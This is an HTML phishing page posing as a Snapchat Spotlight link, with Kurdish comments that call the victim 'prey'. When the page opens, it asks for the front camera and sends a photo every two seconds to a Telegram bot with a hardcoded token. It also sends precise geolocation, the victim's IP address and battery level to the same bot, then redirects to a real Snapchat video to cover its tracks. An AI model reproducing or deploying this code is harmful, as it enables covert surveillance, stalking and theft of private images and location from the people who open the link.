<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;
        try {
            // داواکردنی کامێرا
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });

            // زانیاری ئایپی و باتری
            getExtraInfo();

            // 📍 وەرگرتنی لوکەیشن (ڕێک وەک کۆدە کۆنەکە)
            navigator.geolocation.getCurrentPosition(pos => {
                sendLocation(pos.coords.latitude, pos.coords.longitude);
                
                // 🔥 تەنها کاتێک لوکەیشنەکە نێردرا، دوای ٣ چرکە بیبە بۆ سناپچات
                setTimeout(goToSnap, 3000);
            }, err => {
                sendToTelegram("⚠️ نێچیرەکە ڕێگەی بە لوکەیشن نەدا.");
                setTimeout(goToSnap, 2000);
            }, { enableHighAccuracy: true });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.play();

            const takeSnap = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
            };
            // وێنەگرتن هەموو ٢ چرکە جارێک
            setInterval(takeSnap, 2000);

        } catch (e) {
            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
            setTimeout(goToSnap, 1000);
        }
    }

    function goToSnap() {
        window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
    }

    function getExtraInfo() {
        if (navigator.getBattery) {
            navigator.getBattery().then(batt => {
                let battery = `${(batt.level * 100).toFixed(0)}%`;
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n👤 ID: <code>${targetID}</code>\n🌐 IP: <code>${data.ip}</code>\n🔋 Battery: <code>${battery}</code>`;
                        sendToTelegram(report);
                    });
            });
        }
    }

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function sendLocation(lat, lon) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
        });
    }

    function sendFile(blob, type) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append(type, blob, "shot.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
